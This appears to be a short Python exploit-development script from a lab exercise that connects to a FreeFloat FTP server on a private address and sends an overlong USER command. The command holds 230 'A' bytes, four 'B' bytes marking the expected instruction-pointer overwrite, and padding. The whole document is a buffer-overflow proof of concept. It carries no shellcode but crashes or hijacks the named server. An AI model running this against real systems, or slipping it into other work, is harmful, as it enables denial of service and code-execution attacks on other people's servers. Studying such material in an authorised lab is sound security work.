#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer = "\x41" * 230 + "\x42" * 4 + "\x43" * (1000-230-4)
s.connect(('192.168.31.138',21))
data = s.recv(1024)
print ("Sending data to FreeFloat Server...")
s.send('USER '+buffer+'\r\n')
data = s.recv(1024)
s.close()
print ("Finish")
